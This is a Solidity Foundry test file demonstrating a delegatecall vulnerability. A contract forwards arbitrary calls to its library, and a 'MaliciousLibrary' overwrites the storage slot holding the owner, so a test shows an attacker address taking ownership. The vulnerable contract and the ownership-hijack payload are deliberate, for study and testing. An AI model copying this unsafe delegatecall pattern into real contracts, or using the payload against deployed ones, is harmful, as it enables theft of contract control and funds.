pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import contracts from vulnerability file

// Vulnerable Contract along with external library. The vulnerability is that the contract uses delegatecall to a user provided external library.
contract MaliciousLibrary {
    // pwn() function overwrites slot1 (owner) with caller address.
    function pwn() public {
        assembly {
            sstore(1, caller())
        }
    }
}

contract VulnerableContract {
    // External library address
    address public lib;
    
    // Owner and another state variable
    address public owner;
    uint public someValue;
    
    // Constructor sets the library and the initial owner as the deployer
    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }
    
    // execute() function that performs an unsafe delegatecall to the library
    function execute(bytes memory data) public {
        (bool success, ) = lib.delegatecall(data);
        require(success, "Delegatecall failed");
    }
    
    // Fallback to receive Ether if needed
    receive() external payable {}
}


contract UnsafeExternalLibraryCallTest is Test {
    VulnerableContract vulnerable;
    MaliciousLibrary maliciousLib;
    
    // setUp deploys the malicious library and vulnerable contract.
    function setUp() public {
        // Deploy the malicious library.
        maliciousLib = new MaliciousLibrary();
        
        // Deploy the vulnerable contract with the malicious library address.
        vulnerable = new VulnerableContract(address(maliciousLib));
    }
    
    // This test demonstrates the vulnerability: an attacker can hijack the owner by using delegatecall.
    function testOwnershipHijack() public {
        // Check that the original owner is the deployer
        assertEq(vulnerable.owner(), address(this), "Initial owner should be the deployer");
        
        // Simulate a different attacker using vm.prank.
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        
        // Prepare payload to call pwn() of the library, which in turn will modify the owner variable in VulnerableContract
        bytes memory payload = abi.encodeWithSignature("pwn()");
        vulnerable.execute(payload);
        
        // Now, the owner variable in VulnerableContract should be updated to the attacker's address
        assertEq(vulnerable.owner(), attacker, "Owner should have been hijacked to the attacker address");
    }
    
    // Additionally, we can test execution failure if delegatecall fails.
    // This is only added for completeness, but here a valid malicious payload is provided, so it should succeed.
    function testExecuteRevertForInvalidPayload() public {
        // use an invalid payload that does not match any function in the malicious library
        bytes memory invalidPayload = abi.encodeWithSignature("nonExistingFunction()");
        
        // Expect the delegatecall to revert 
        vm.expectRevert();
        vulnerable.execute(invalidPayload);
    }
}
